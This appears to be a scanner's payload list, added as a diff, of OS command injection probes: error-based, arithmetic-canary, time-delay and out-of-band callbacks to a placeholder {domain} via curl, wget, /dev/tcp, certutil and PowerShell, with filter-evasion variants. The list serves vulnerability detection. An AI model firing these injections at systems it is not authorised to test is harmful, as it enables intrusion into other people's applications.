@@ -1,0 +1,120 @@
+##OS Cmd Injection - Error-Based##
+;invalidcmd
+|invalidcmd
+||invalidcmd
+&&invalidcmd
+;invalidcmd #
+|invalidcmd #
+& invalidcmd
+&& invalidcmd
+;invalidcmd;
+|invalidcmd|
+;invalidcmd#'|invalidcmd|"`invalidcmd`
+;invalidcmd${IFS}arg
+;/usr/bin/invalidcmd
+& invalidcmd.exe
+;invalidcmd 2>&1
+##OS Cmd Injection - Math-Based (Canary: 1337)##
+;expr 7 \* 191
+;echo $((7*191))
+|expr 7 \* 191
+|echo $((7*191))
+||echo $((7*191))
+&&echo $((7*191))
+$(echo $((7*191)))
+`expr 7 \* 191`
+`echo $((7*191))`
+;echo $((7*191))#'`echo $((7*191))`"
+;python3 -c "print(7*191)"
+;python -c "print(7*191)"
+;perl -e "print 7*191"
+;ruby -e "puts 7*191"
+;node -e "console.log(7*191)"
+& set /a 7*191
+& powershell -c "7*191"
+;echo $((7331/1*1))
+|echo $((7331-0))
+;printf '%d' $((7*191))
+;awk 'BEGIN{print 7*191}'
+;bc <<< "7*191"
+${IFS};echo${IFS}$((7*191))
+##OS Cmd Injection - Timing-Based##
+;sleep 5
+|sleep 5
+||sleep 5
+&&sleep 5
+$(sleep 5)
+`sleep 5`
+;sleep 5 #
+|sleep 5 #
+;sleep${IFS}5
+${IFS}sleep${IFS}5
+;sleep 5;
+|sleep 5|
+||sleep 5||
+&&sleep 5&&
+;sleep 5#'|sleep 5|"`sleep 5`
+;/bin/sleep 5
+;/usr/bin/sleep 5
+;$(sleep 5)
+;`sleep 5`
+& timeout 5
+| timeout 5
+|| timeout 5
+&& timeout 5
+& timeout /t 5 /nobreak
+| timeout /t 5 /nobreak
+& ping -n 6 127.0.0.1
+| ping -n 6 127.0.0.1
+& ping -n 6 127.0.0.1 >nul
+& powershell Start-Sleep -s 5
+| powershell Start-Sleep -s 5
+& powershell -c "Start-Sleep 5"
+;sleep 5 #'& timeout 5 &"`sleep 5`
+;python3 -c "__import__('time').sleep(5)"
+;python -c "import time;time.sleep(5)"
+;perl -e "sleep(5)"
+;ruby -e "sleep(5)"
+;node -e "require('child_process').execSync('sleep 5')"
+;sleep$IFS'5'
+;sl\eep 5
+;s'l'e'e'p 5
+;s"l"e"e"p 5
+;$'\x73\x6c\x65\x65\x70' 5
+;/???/s?e?p 5
+##OS Cmd Injection - OOB##
+;curl http://{domain}
+|curl http://{domain}
+||curl http://{domain}
+&&curl http://{domain}
+;curl${IFS}http://{domain}
+;wget http://{domain}
+|wget http://{domain}
+;nslookup {domain}
+|nslookup {domain}
+||nslookup {domain}
+&&nslookup {domain}
+;ping -c 1 {domain}
+|ping -c 1 {domain}
+;dig {domain}
+;host {domain}
+;/bin/bash -c "true > /dev/tcp/{domain}/9999"
+;python3 -c "__import__('urllib.request').request.urlopen('http://{domain}')"
+;python -c "import urllib2;urllib2.urlopen('http://{domain}')"
+;curl http://{domain}#'|curl http://{domain}|"`curl http://{domain}`
+& nslookup {domain}
+| nslookup {domain}
+|| nslookup {domain}
+&& nslookup {domain}
+& certutil -urlcache -f http://{domain} out.tmp
+& powershell Invoke-WebRequest http://{domain}
+& powershell -c "iwr http://{domain}"
+| powershell -c "(New-Object Net.WebClient).DownloadString('http://{domain}')"
+& ping -n 1 {domain}
+| ping -n 1 {domain}
+;curl${IFS}http://{domain}#'&${IFS}nslookup${IFS}{domain}&"`curl${IFS}http://{domain}`
+;perl -e "use IO::Socket::INET;IO::Socket::INET->new(PeerAddr=>'{domain}',PeerPort=>9999)"
+;ruby -e "require 'net/http';Net::HTTP.get(URI('http://{domain}'))"
+;node -e "require('http').get('http://{domain}')"
+;python3 -c "__import__('socket').create_connection(('{domain}',9999))"
+;php -r "fsockopen('{domain}',9999);"
